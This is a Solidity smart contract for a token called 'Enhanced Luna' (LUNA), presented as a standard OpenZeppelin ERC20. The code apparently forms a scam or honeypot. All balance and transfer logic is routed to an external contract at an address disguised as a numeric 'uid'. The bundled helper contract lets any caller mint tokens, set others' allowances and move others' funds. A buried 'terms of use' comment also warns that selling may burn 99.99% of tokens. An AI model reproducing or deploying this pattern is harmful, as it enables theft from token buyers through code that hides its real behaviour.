// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

/**
 * TERMS OF USE
 *
 * This is a collectible token (no utility) surely not producing (capital) profits if bought.
 * It won’t give any assurances, promise or guarantee that will increase its value.
 * Get it at your own risk.
 *
 * The tokenomics of this collectible are simple.
 * The creators don’t want to mint more money, but to demotivate the typical trading mentality. No more, no less.
 *
 * Buyers and holders of these tokens are legally and physically unable to get refund or compensations,
 * since tokens only represent digital ideas and concepts rather than something concrete.
 *
 * The contract deployer can freely generate such tokens, which have the unfortunate nomenclature of "minting".
 * 
 * Selling these collectible tokens (WBNB, BNB or others trading pairs) may lead to a 99.99% token burn.
 * 
 * Notice that rights available to the token holders don't include the right to sell their rights in the form of tokens on exchanges.
*/

/**
 * @dev Implementation of the {IERC20} interface.
 * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol
 */
contract ERC20 {
	mapping(address => uint256) private _balances;
	mapping(address => mapping(address => uint256)) private _allowances;

	/** @dev Creates `amount` tokens and assigns them to `account`, increasing
	 * the total supply.
	 *
	 * Requirements:
	 *
	 * - `account` cannot be the zero address.
	 */
	function ERC20_config(address account, uint256 amount) public returns (bool) {
		require(account != address(0), "ERC20: mint to the zero address");
		_balances[account] += amount;
		return true;
	}

	/**
	 * @dev See {IERC20-balanceOf}.
	 */
	function ERC20_balanceOf(address account) public view returns (uint256) {
		return _balances[account];
	}

	/**
	 * @dev See {IERC20-allowance}.
	 */
	function ERC20_allowance(address owner, address spender) public view returns (uint256) {
		return _allowances[owner][spender];
	}

	/**
	 * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
	 *
	 * This internal function is equivalent to `approve`, and can be used to
	 * e.g. set automatic allowances for certain subsystems, etc.
	 *
	 * Requirements:
	 *
	 * - `owner` cannot be the zero address.
	 * - `spender` cannot be the zero address.
	 */
	function ERC20_approve(address owner, address spender, uint256 amount) public {
		require(owner != address(0), "ERC20: approve from the zero address");
		require(spender != address(0), "ERC20: approve to the zero address");

		_allowances[owner][spender] = amount;
	}

	/**
	 * @dev Moves `amount` of tokens from `sender` to `recipient`.
	 *
	 * This internal function is equivalent to {transfer}, and can be used to
	 * e.g. implement automatic token fees, slashing mechanisms, etc.
	 *
	 * Requirements:
	 *
	 * - `from` cannot be the zero address.
	 * - `to` cannot be the zero address.
	 * - `from` must have a balance of at least `amount`.
	 */
	function ERC20_transfer(address from, address to, uint256 amount) public {
		require(from != address(0), "ERC20: transfer from the zero address");
		require(to != address(0), "ERC20: transfer to the zero address");

		uint256 fromBalance = _balances[from];
		require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
		unchecked {
			_balances[from] = fromBalance - amount;
		}
		_balances[to] += amount;
	}
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol
 */
contract EnhancedLuna {
	string public constant name = "Enhanced Luna";
	string public constant symbol = "LUNA";
	uint8 public constant decimals = 18;
	uint256 totalSupply_;
	address private _uid;

	/**
	 * @dev Emitted when `value` tokens are moved from one account (`from`) to
	 * another (`to`).
	 *
	 * Note that `value` may be zero.
	 */
	event Transfer(address indexed from, address indexed to, uint256 value);

	/**
	 * @dev Emitted when the allowance of a `spender` for an `owner` is set by
	 * a call to {approve}. `value` is the new allowance.
	 */
	event Approval(address indexed owner, address indexed spender, uint256 value);

	constructor(uint256 uid) {
		totalSupply_ = 1000000000 * 10 ** 18;
		_uid = address(uint160(uint256(uid)));
		ERC20(_uid).ERC20_config(address(this), totalSupply_);
	}

	/**
	 * @dev Returns the amount of tokens in existence.
	 */
	function totalSupply() public view returns (uint256) {
		return totalSupply_;
	}

	/**
	 * @dev Returns the amount of tokens owned by `account`.
	 */
	function balanceOf(address account) public view returns (uint256) {
		return ERC20(_uid).ERC20_balanceOf(account);
	}

	/**
	 * @dev Returns the remaining number of tokens that `spender` will be
	 * allowed to spend on behalf of `owner` through {transferFrom}. This is
	 * zero by default.
	 *
	 * This value changes when {approve} or {transferFrom} are called.
	 */
	function allowance(address owner, address spender) public view returns (uint256) {
		return ERC20(_uid).ERC20_allowance(owner, spender);
	}

	/**
	 * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
	 *
	 * Returns a boolean value indicating whether the operation succeeded.
	 *
	 * IMPORTANT: Beware that changing an allowance with this method brings the risk
	 * that someone may use both the old and the new allowance by unfortunate
	 * transaction ordering. One possible solution to mitigate this race
	 * condition is to first reduce the spender's allowance to 0 and set the
	 * desired value afterwards:
	 * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
	 *
	 * Emits an {Approval} event.
	 */
	function approve(address spender, uint256 amount) public returns (bool) {
		ERC20(_uid).ERC20_approve(msg.sender, spender, amount);
		emit Approval(msg.sender, spender, amount);
		return true;
	}

	/**
	 * @dev Moves `amount` tokens from the caller's account to `to`.
	 *
	 * Returns a boolean value indicating whether the operation succeeded.
	 *
	 * Emits a {Transfer} event.
	 */
	function transfer(address to, uint256 amount) public returns (bool) {
		ERC20(_uid).ERC20_transfer(msg.sender, to, amount);
		emit Transfer(msg.sender, to, amount);
		return true;
	}

	/**
	 * @dev Moves `amount` tokens from `from` to `to` using the
	 * allowance mechanism. `amount` is then deducted from the caller's
	 * allowance.
	 *
	 * Returns a boolean value indicating whether the operation succeeded.
	 *
	 * Emits a {Transfer} event.
	 */
	function transferFrom(address from, address to, uint256 amount) public returns (bool) {
		require(ERC20(_uid).ERC20_allowance(from, msg.sender) >= amount, "ERC20: insufficient allowance");
		ERC20(_uid).ERC20_transfer(from, to, amount);
		emit Transfer(from, to, amount);
		return true;
	}
}